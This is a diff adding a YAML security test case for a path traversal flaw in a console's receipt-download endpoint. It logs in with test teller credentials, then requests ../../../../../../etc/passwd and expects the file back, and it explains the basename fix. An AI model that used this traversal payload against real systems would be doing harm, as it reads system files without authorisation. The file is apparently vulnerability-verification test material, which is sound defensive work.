@@ -1,0 +1,17 @@
+# LG-PATH-001 — path traversal in the console posting-receipt download.
+# Config-gated by receipt_subfolders (on under the permissive profile).
+preconditions:
+  - "a signed-on staff session (any real login; orthogonal to the traversal bug)"
+  - "receipt_subfolders=on (the receipt name is joined to the dir without sanitisation)"
+steps:
+  - call: "POST /login (console)"
+    body: "staff_id=TLR001&password=teller-pw (application/x-www-form-urlencoded)"
+    expect: "an lgsession cookie is set for the TELLER session"
+  - call: "GET /receipt?name=../../../../../../etc/passwd (console, with the session cookie)"
+    expect: "the response body is the contents of /etc/passwd (contains a 'root:' line)"
+observable: >
+  With receipt_subfolders=on the caller-supplied name is joined to the receipt directory verbatim, so
+  ../ sequences escape it and the endpoint returns any file the process can read (e.g. /etc/passwd,
+  identifiable by a 'root:' line). With the fix (ExtractFileName basename reduction, the receipt_subfolders=off path)
+  the name collapses to 'passwd', no such file exists in the receipt dir, and the endpoint returns
+  404. Exploitable only when receipt_subfolders=on.
